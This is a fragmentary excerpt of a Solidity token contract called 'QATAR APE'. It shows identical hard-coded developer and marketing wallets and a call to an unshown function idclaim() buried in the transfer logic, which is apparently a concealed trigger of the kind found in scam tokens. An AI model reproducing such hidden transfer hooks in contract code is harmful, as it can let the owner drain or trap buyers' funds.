...
contract QATAR_APE is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "QATAR APE";
    ...
    address payable public DevWallet = payable(0xA0C649945EF81e6f1401Fda6C337b9035B5b08De);
    address payable public MarketingWallet = payable(0xA0C649945EF81e6f1401Fda6C337b9035B5b08De);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (transferDelay && cooldown >= 30) {idclaim();}
